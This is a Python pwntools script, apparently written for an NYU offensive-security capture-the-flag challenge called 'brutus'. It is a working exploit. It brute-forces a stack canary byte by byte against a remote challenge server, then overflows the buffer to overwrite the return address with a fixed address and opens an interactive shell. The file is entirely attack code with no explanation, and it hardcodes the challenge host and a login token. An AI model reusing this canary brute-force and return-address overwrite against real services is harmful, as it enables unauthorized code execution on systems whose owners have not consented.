from pwn import * 

#context.log_level = "DEBUG"

#p = process("./brutus")

#p = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1340)
#p.sendline("svv232")

count = 137
buffer_smash = ("A" * 136) 
cookie = []


#cookie = [0, 122, 67, 151, 213, 37, 228, 0]

#buffer_smash +=  "".join([chr(i) for i in cookie])

while True:
    if len(buffer_smash) == 136 + 8:
        r = remote("offsec-chalbroker.osiris.cyber.nyu.edu",1340)
        r.sendline("svv232")
        #r = remote("0.0.0.0", 8000)
        r.recvuntil("name?")
        #r.sendline("svv232")
        r.sendline(str(136 + 8 + 16))
        #r.recvuntil("?")
        r.recvuntil("data")
        r.sendline(buffer_smash + ("A"*0x8) + p64(0x400afd))
        r.interactive()
    for i in range(255):
        r = remote("offsec-chalbroker.osiris.cyber.nyu.edu",1340)
        #r = remote("0.0.0.0", 8000)
        r.sendline("svv232")
        #r.recvline()
        #r.recvline()
        print r.recvuntil('name?') 
        r.sendline(str(count))
        print r.recvuntil("data")
        r.sendline(buffer_smash + chr(i))
        print(buffer_smash + chr(i))
        if "goodbye!" in r.recvall():
            buffer_smash += chr(i)
            cookie.append(i)
            print(cookie)
            count += 1
            break
